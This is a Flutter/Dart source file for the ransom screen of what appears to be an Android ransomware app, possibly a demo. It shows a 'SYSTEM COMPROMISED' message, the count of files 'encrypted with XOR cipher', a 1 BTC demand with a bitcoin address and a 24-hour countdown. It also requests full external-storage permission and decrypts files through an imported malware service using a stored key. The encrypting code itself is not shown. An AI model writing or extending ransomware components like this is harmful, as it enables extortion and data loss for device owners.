import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'dart:async';
import 'dart:io';
import 'package:permission_handler/permission_handler.dart';
import '../services/malware_service.dart';

class RansomScreen extends StatefulWidget {
  final int fileCount;
  final String manifestPath;
  final String targetFilePath;

  const RansomScreen({
    super.key,
    required this.fileCount,
    required this.manifestPath,
    required this.targetFilePath,
  });

  @override
  State<RansomScreen> createState() => _RansomScreenState();
}

class _RansomScreenState extends State<RansomScreen> {
  int _counter = 24 * 60 * 60;
  late Timer _timer;
  String _manifestContent = 'Loading...';

  @override
  void initState() {
    super.initState();
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (_counter <= 0) timer.cancel();
      else setState(() => _counter--);
    });
    _loadManifest();
  }

  Future<void> _loadManifest() async {
    try {
      final file = File(widget.manifestPath);
      if (await file.exists()) {
        final content = await file.readAsString();
        setState(() => _manifestContent = content);
      }
    } catch (e) {
      setState(() => _manifestContent = 'Manifest file not found.');
    }
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  String _formatTime(int seconds) {
    final hours = seconds ~/ 3600;
    final minutes = (seconds % 3600) ~/ 60;
    final secs = seconds % 60;
    return '${hours.toString().padLeft(2, '0')}:${minutes.toString().padLeft(2, '0')}:${secs.toString().padLeft(2, '0')}';
  }

  Future<bool> _requestStoragePermissions() async {
    if (await Permission.manageExternalStorage.isPermanentlyDenied) {
      openAppSettings();
      return false;
    }
    Map<Permission, PermissionStatus> statuses = await [
      Permission.manageExternalStorage,
      Permission.storage,
    ].request();

    final manageGranted = statuses[Permission.manageExternalStorage]?.isGranted ?? false;
    final storageGranted = statuses[Permission.storage]?.isGranted ?? false;
    return manageGranted || storageGranted;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Container(
        decoration: BoxDecoration(
          gradient: const RadialGradient(
            center: Alignment.center,
            radius: 1.0,
            colors: [Color(0xFF2A0A0A), Colors.black],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Text('💀', style: TextStyle(fontSize: 80)),
                const SizedBox(height: 20),
                Text(
                  'SYSTEM COMPROMISED',
                  style: GoogleFonts.orbitron(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.redAccent,
                    shadows: [Shadow(color: Colors.redAccent.withOpacity(0.5), blurRadius: 30)],
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 10),
                Text(
                  '${widget.fileCount} files encrypted',
                  style: const TextStyle(color: Colors.white70, fontSize: 18),
                ),
                const SizedBox(height: 20),
                Text(
                  'Your entire storage has been encrypted with XOR cipher.\nPay 1 BTC to recover all files.',
                  style: const TextStyle(color: Colors.white70, fontSize: 16, height: 1.5),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 30),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                  decoration: BoxDecoration(
                    border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
                    borderRadius: BorderRadius.circular(8),
                    color: Colors.white.withOpacity(0.05),
                  ),
                  child: const Text(
                    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
                    style: TextStyle(fontSize: 14, color: Colors.white, fontFamily: 'monospace'),
                  ),
                ),
                const SizedBox(height: 40),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    color: Colors.redAccent.withOpacity(0.1),
                  ),
                  child: Text(
                    '⏱ TIME LEFT: ${_formatTime(_counter)}',
                    style: const TextStyle(fontSize: 22, color: Colors.orange, fontWeight: FontWeight.bold),
                  ),
                ),
                const SizedBox(height: 20),
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.black54,
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: Text(
                    _manifestContent.split('\n').take(6).join('\n') + '\n...',
                    style: const TextStyle(color: Colors.greenAccent, fontSize: 12, fontFamily: 'monospace'),
                    textAlign: TextAlign.center,
                  ),
                ),
                const SizedBox(height: 40),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: [
                    ElevatedButton(
                      onPressed: () async {
                        // 1. Request permissions
                        final hasPermissions = await _requestStoragePermissions();
                        if (!hasPermissions) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('Storage permissions are required to decrypt. Please grant them in system settings.')),
                          );
                          return;
                        }

                        // 2. Retrieve the key
                        final keyHex = await MalwareService.getEncryptionKey();
                        if (keyHex == null) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('Encryption key not found. Cannot decrypt.')),
                          );
                          return;
                        }

                        // 3. Show progress dialog
                        showDialog<void>(
                          context: context,
                          barrierDismissible: false,
                          builder: (_) => const AlertDialog(
                            title: Text('Decrypting…'),
                            content: Row(
                              children: [
                                CircularProgressIndicator(),
                                SizedBox(width: 18),
                                Expanded(child: Text('Restoring files…')),
                              ],
                            ),
                          ),
                        );

                        try {
                          // ✅ Use runOperation (embedded logic) instead of runPayload
                          final result = await MalwareService.runOperation(
                            operation: 'decrypt',
                            rootPath: widget.targetFilePath,
                            key: keyHex,
                          );

                          if (result.containsKey('error')) {
                            throw Exception(result['error']);
                          }

                          final decryptedCount = result['count'] as int? ?? 0;   // ✅ field name changed
                          if (decryptedCount == 0) {
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text('No encrypted files found to decrypt.')),
                            );
                          } else {
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(content: Text('✅ $decryptedCount files restored!')),
                            );
                            await MalwareService.clearEncryptionKey();
                          }

                          if (mounted) {
                            Navigator.of(context, rootNavigator: true).pop();
                            Navigator.popUntil(context, (route) => route.isFirst);
                          }
                        } catch (e) {
                          if (mounted) Navigator.of(context, rootNavigator: true).pop();
                          ScaffoldMessenger.of(context).showSnackBar(
                            SnackBar(content: Text('❌ Decryption failed: $e')),
                          );
                        }
                      },
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.redAccent,
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(30)),
                        padding: const EdgeInsets.symmetric(horizontal: 30, vertical: 16),
                      ),
                      child: const Text('🔓 DECRYPT (demo)'),
                    ),
                    OutlinedButton(
                      onPressed: () {
                        Navigator.popUntil(context, (route) => route.isFirst);
                      },
                      style: OutlinedButton.styleFrom(
                        side: const BorderSide(color: Colors.white24),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(30)),
                        padding: const EdgeInsets.symmetric(horizontal: 30, vertical: 16),
                      ),
                      child: const Text('RESTART', style: TextStyle(color: Colors.white54)),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}